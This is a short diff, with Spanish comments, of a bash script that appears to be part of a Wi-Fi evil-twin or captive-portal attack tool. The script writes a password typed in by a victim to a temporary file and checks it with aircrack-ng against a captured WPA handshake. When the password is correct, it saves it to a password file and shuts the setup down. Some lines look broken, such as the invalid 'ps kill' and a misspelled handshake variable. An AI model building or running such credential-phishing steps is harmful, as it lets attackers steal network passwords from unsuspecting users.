@@ -20,19 +20,21 @@ case "$METHOD" in
                PASSWORD="$4"
                
                
-               # Guardamos la contraseña dada por el usuario.
-               echo "$4" >> PASSWORD_FILE
+               # Guardamos la contraseña dada por el usuario de forma temporal hasta comprobar que sea correcta.
+	       echo "$4" > last_password.lst
                # Comprobamos si la contraseña dada por el usuario es la correcta.
-               aircrack-ng -w $PASSWORD_FILE -b $AP_MAC $HANDSAHKE | grep "KEY FOUND!"
+               aircrack-ng -w last_password.lst -b $AP_MAC $HANDSAHKE | grep "KEY FOUND!"
                # ¿Es correcta?
                if [ $? -eq 0 ]; then
                      # Contraseña encontrada!
                      echo 0 0 0
-                     echo "Bien!" >> bien.txt
-                     exit 0
+	             # Guardamos la contraseña correcta.
+                     echo "$4" >> $PASSWORD_FILE
+		     # Desmontamos todo el chiringuito
+                     ps kill
+		     exit 0
                else
                      # Contraseña incorrecta!
-                     echo "Mal!" >> mal.txt
                      exit 1
                fi
 
